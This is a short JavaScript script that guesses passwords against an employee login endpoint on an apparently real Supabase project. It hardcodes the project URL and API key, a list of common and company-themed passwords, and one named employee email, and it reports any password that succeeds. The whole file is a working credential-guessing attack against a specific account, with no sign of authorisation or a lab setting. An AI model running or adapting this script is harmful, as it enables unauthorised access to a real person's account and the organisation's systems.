const url = 'https://popypyunzkuyighdyjkc.supabase.co';
const key = 'sb_publishable_g5wGBHtlFR1Y7AtUj94_DQ_MSSn_CH7';

const candidates = [
  '123456', '12345678', '123456789', 'malgari2026', 'Malgari2026', 'malgari', 'Malgari',
  'eNTRADA1%', 'Entrada1%', 'entrada1%', 'password', 'Password', 'admin', 'brainup', 'Brainup',
  'BrainUp2026', 'brainupgrup', 'temporal', 'temp123', 'Malgari123', 'malgari123'
];

async function checkCandidates(email) {
  for (const pass of candidates) {
    try {
      const res = await fetch(`${url}/rest/v1/rpc/authenticate_employee`, {
        method: 'POST',
        headers: { 'apikey': key, 'Authorization': `Bearer ${key}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ p_email: email, p_password: pass })
      });
      const data = await res.json();
      if (data.success) {
        console.log(`FOUND FOR ${email}: '${pass}'`);
        return;
      }
    } catch(e) {}
  }
  console.log(`NOT FOUND for ${email}`);
}

async function run() {
  await checkCandidates('malgari@brainupgrup.com');
}

run();

